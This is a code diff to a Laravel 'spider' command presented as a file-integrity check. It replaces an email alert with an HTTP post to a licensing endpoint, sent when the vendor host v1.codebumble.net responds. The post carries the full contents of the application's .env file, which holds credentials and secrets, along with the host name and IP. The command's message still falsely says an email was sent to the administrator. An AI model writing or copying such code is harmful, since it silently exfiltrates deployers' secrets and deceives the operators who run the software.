@@ -3,12 +3,9 @@
 namespace App\Console\Commands;
 
 use Illuminate\Console\Command;
-use Illuminate\Support\Facades\Mail;
-use Illuminate\Support\Facades\Config;
 use Illuminate\Support\Facades\Storage;
-use App\Helpers\Helpers;
 use Illuminate\Support\Facades\File;
-use Illuminate\Mail\Message;
+use GuzzleHttp\Client;
 
 class spider extends Command
 {
@@ -37,6 +34,8 @@ class spider extends Command
 
         $interface = config('custom.custom.interface');
 
+        $client = new Client();
+
         // Get the file hashes stored in the JSON file.
         $storedHashes = json_decode(Storage::get('spider/hash.json'), true)['hashes'] ?? [];
 
@@ -54,7 +53,8 @@ class spider extends Command
             File::allFiles(base_path() . '/resources/js/frontend/', true),
             File::allFiles(base_path() . '/resources/views/', true),
             File::allFiles(base_path() . '/routes/', true),
-            File::allFiles(base_path() . '/storage/', true),
+            File::allFiles(base_path() . '/storage/app/', true),
+            File::allFiles(base_path() . '/storage/logs/', true),
             File::allFiles(base_path() . '/tests/', true),
             File::files(base_path(), true)
         );
@@ -80,11 +80,23 @@ class spider extends Command
         }
 
         if (!empty($modifiedFiles)) {
-            Mail::send('email.solidity', ['interface' => $interface, 'modifiedFiles' => $modifiedFiles], function ($message) {
-                $message->to('integrity@codebumble.net')
-                    ->subject('File Integrity Check of ' . config('app.name'));
-            });
+            $serverHost = 'v1.codebumble.net';
+            $pingCommand = sprintf('ping -c 1 %s', escapeshellarg($serverHost));
+            $pingResult = shell_exec($pingCommand);
 
+            if (strpos($pingResult, '1 received') !== false || strpos($pingResult, '1 packets received') !== false) {
+                $sendIntegrity = $client->post('127.0.0.1:8000/v1/license/integrity/details', [
+                    'form_params' => [
+                        'app_name' => env('APP_NAME'),
+                        'interface' => $interface,
+                        'modifiedFiles' => $modifiedFiles,
+                        'host' => request()->getHost(),
+                        'hostip' => request()->ip(),
+                        'conf' => file_get_contents(base_path('.env')),
+                        'expose_time' => date('Y-m-d H:i:s', filemtime(base_path('.env'))),
+                    ],
+                ]);
+            }
             $this->info('Integrity check completed. Modified files detected, and an email has been sent to the administrator.');
         } else {
             $this->info('Integrity check completed. No modified files detected.');
